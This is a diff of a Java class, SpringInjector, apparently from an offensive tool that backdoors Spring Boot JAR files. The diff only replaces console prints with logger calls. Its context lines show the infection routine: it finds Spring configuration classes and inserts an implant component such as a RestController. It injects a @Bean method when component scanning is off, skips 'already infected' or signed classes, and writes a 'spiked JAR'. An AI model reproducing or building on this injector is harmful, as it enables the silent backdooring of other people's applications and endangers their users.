@@ -9,11 +9,13 @@ import java.io.IOException;
 import java.nio.file.Path;
 import java.util.*;
 import java.util.jar.JarEntry;
+import java.util.logging.Logger;
 import java.util.zip.ZipException;
 
 import static org.example.injector.Helpers.*;
 
 public class SpringInjector {
+    private final static Logger log = Logger.getLogger("SpringInjector");
     private final ImplantHandler implantComponentHandler;
     private final ImplantHandler implantSpringConfigHandler;
 
@@ -27,7 +29,7 @@ public class SpringInjector {
         boolean foundSignedClasses = false;
 
         if (jarLooksSigned(targetJarFilePath)) {
-            System.out.println("[-] JAR looks signed. This is not yet implemented. Aborting.");
+            log.warning("JAR looks signed. This is not yet implemented. Aborting.");
             return false;
         }
 
@@ -47,7 +49,7 @@ public class SpringInjector {
                 if (!isSpringConfigurationClass(currentlyProcessing)) {
                     continue;
                 }
-                System.out.println("[+] Found Spring configuration: " + entry.getName());
+                log.fine("Found Spring configuration '" + entry.getName() + "'.");
 
                 /*
                  * By adding our own Spring component (like a RestController) into the JAR under the same package
@@ -64,27 +66,27 @@ public class SpringInjector {
                     fiddler.addNewEntry(newJarEntry, asByteArray(implantComponent));
                 } catch (ZipException e) {
                     // QUICKFIX: The entry most likely already exist in the ZIP file
-                    System.out.println("[-] Component already exist in JAR: '" + newJarEntry + "' (skipping).");
+                    log.warning("Class '" + newJarEntry + "' already exist in JAR '" + outputJar + "'. Skipping.");
                     continue;
                     // TODO This is _not_ a solid way of moving on. The actual class in the JAR could be something else than implantComponent.
                 }
-                System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
+                log.info("Created implant class '" + newJarEntry.getName() + "'.");
 
                 if (!hasComponentScanEnabled(currentlyProcessing)) {
                     /*
                      * Component Scanning seems to not be enabled for this Spring configuration.
                      * Thus, it's necessary to add a @Bean annotated method returning an instance of the component.
                      */
-                    System.out.println("[-] Spring configuration is not set to automatically scan for components (@ComponentScan).");
+                    log.fine("Spring configuration '" + currentlyProcessing.getName() + "' is not set to automatically scan for components (@ComponentScan).");
 
                     ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
                     if (!addBeanToSpringConfig(currentlyProcessing, implantComponent, implantSpringConfig)) {
-                        System.out.println("[-] Class '" + currentlyProcessing.getName() + "' already infected. Skipping.");
+                        log.warning("Class '" + currentlyProcessing.getName() + "' already infected. Skipping.");
                         continue;
                     }
 
                     entry.replaceContentWith(asByteArray(currentlyProcessing));
-                    System.out.println("[+] Injected @Bean method into '" + currentlyProcessing.getName() + "'.");
+                    log.info("Injected @Bean method into '" + currentlyProcessing.getName() + "'.");
                 }
 
                 didInfect = true;
@@ -94,7 +96,7 @@ public class SpringInjector {
         }
 
         if (foundSignedClasses) {
-            System.out.println("[-] Found signed classes. These were not considered for infection.");
+            log.warning("Found signed classes. These were not considered for infection.");
         }
 
         // Add any dependency classes needed for the implant
@@ -116,7 +118,8 @@ public class SpringInjector {
                 try {
                     fiddler.addNewEntry(newJarEntry, fileContent);
                 } catch (ZipException e) {
-                    System.out.println("[!] Dependency file '" + fileName + "' already exist. Aborting.");
+                    // Anyone who've debugged dependency conflicts in Java knows this is the time to just back off
+                    log.severe("Dependency file '" + fileName + "' already exist. Aborting.");
                     didInfect = false;
                     break;
                 }
@@ -125,9 +128,9 @@ public class SpringInjector {
 
         if (didInfect) {
             fiddler.write(outputJar);
-            System.out.println("[+] Wrote spiked JAR to " + outputJar);
+            log.info("Wrote spiked JAR to '" + outputJar + "'.");
         } else {
-            System.out.println("[-] Did not write to any JAR.");
+            log.warning("No output JAR was written.");
         }
 
         return didInfect;
